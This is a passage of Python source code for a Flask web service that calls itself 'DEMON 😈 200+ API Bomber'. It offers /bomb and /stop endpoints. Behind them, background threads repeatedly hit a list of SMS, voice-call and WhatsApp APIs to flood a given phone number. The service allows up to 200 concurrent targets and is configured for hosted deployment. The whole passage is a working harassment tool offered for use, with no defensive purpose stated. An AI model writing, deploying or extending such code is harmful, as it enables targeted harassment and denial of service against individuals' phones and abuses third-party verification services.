        greenlets = []
        for api in API_LIST:
            if self.stop_event.is_set():
                break
            g = pool.spawn(self.hit_api, api)
            greenlets.append(g)
        pool.join()
        for g in greenlets:
            try:
                result = g.value
                if result:
                    self.results.append(result)
            except Exception:
                pass
        return {
            'total': len(API_LIST),
            'success': self.success,
            'failed': self.failed,
        }


def _bomb_worker(phone, threads, delay, stop_event):
    """Background worker: keeps bombing until stop_event is set."""
    try:
        while not stop_event.is_set():
            bomber = DemonBomber(phone, threads=threads, delay=delay, stop_event=stop_event)
            bomber.run()
            if not stop_event.is_set():
                # Short sleep between cycles so we don't hammer instantly
                gevent_sleep(max(1, delay))  # gevent cooperative sleep
    finally:
        # Clean up session entry when done
        with _sessions_lock:
            if _active_sessions.get(phone) is stop_event:
                del _active_sessions[phone]


# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def home():
    with _sessions_lock:
        active_count = len(_active_sessions)
    return jsonify({
        'status': 'online',
        'name': 'DEMON 😈 200+ API Bomber',
        'version': '4.0',
        'total_apis': len(API_LIST),
        'active_sessions': active_count,
        'endpoints': {
            '/bomb?phone=XXXXXXXXXX': 'Start bombing (async, returns immediately)',
            '/stop?phone=XXXXXXXXXX': 'Stop bombing for a number',
            '/status': 'Check status',
            '/stats': 'Get API stats',
        }
    })


@app.route('/status')
def status():
    with _sessions_lock:
        active_count = len(_active_sessions)
        active_phones = list(_active_sessions.keys())
    return jsonify({
        'status': 'active',
        'total_apis': len(API_LIST),
        'active_sessions': active_count,
        'active_phones': active_phones,
        'uptime': 'Running'
    })


@app.route('/stats')
def stats():
    sms = len([a for a in API_LIST if 'voice' not in a['name'].lower() and 'whatsapp' not in a['name'].lower()])
    call = len([a for a in API_LIST if 'voice' in a['name'].lower() or 'call' in a['name'].lower()])
    whatsapp = len([a for a in API_LIST if 'whatsapp' in a['name'].lower()])
    with _sessions_lock:
        active_count = len(_active_sessions)
    return jsonify({
        'total_apis': len(API_LIST),
        'sms_apis': sms,
        'call_apis': call,
        'whatsapp_apis': whatsapp,
        'threads_per_cycle': 25,
        'active_sessions': active_count,
    })


@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    try:
        if request.method == 'GET':
            phone = request.args.get('phone')
            threads = int(request.args.get('threads', 10))
            delay = int(request.args.get('delay', 2))
        else:
            data = request.get_json() or {}
            phone = data.get('phone')
            threads = int(data.get('threads', 10))
            delay = int(data.get('delay', 2))

        if not phone:
            return jsonify({'error': 'Phone number required'}), 400

        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) < 10:
            return jsonify({'error': 'Invalid phone number'}), 400

        threads = min(threads, 25)  # Allow up to 25 threads per session
        delay = min(delay, 5)

        with _sessions_lock:
            if len(_active_sessions) >= 200:
                return jsonify({
                    'status': 'server_busy',
                    'message': 'Max concurrent sessions reached (200). Try again later.'
                }), 503

            if phone in _active_sessions:
                # Already bombing — just acknowledge
                return jsonify({
                    'status': 'already_running',
                    'phone': phone,
                    'message': f'Bombing already active for {phone}'
                })

            # Create a stop event and register it
            stop_event = threading.Event()
            _active_sessions[phone] = stop_event

        # Start bombing in a background daemon thread — returns immediately
        t = threading.Thread(
            target=_bomb_worker,
            args=(phone, threads, delay, stop_event),
            daemon=True
        )
        t.start()

        return jsonify({
            'status': 'started',
            'phone': phone,
            'message': f'Bombing started for {phone}',
            'total_apis': len(API_LIST),
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/stop', methods=['GET', 'POST'])
def stop_bomb():
    try:
        if request.method == 'GET':
            phone = request.args.get('phone')
        else:
            data = request.get_json() or {}
            phone = data.get('phone')

        if not phone:
            return jsonify({'error': 'Phone number required'}), 400

        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) < 10:
            return jsonify({'error': 'Invalid phone number'}), 400

        with _sessions_lock:
            stop_event = _active_sessions.pop(phone, None)

        if stop_event:
            stop_event.set()  # Signal the background thread to stop
            return jsonify({
                'status': 'stopped',
                'phone': phone,
                'message': f'Bombing stopped for {phone}'
            })
        else:
            return jsonify({
                'status': 'not_active',
                'phone': phone,
                'message': f'No active session for {phone}'
            })

    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================
# MAIN - RENDER DEPLOYMENT
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[DEMON] Starting on port {port}")
    print(f"[DEMON] Total APIs: {len(API_LIST)}")
    app.run(host='0.0.0.0', port=port, debug=False)
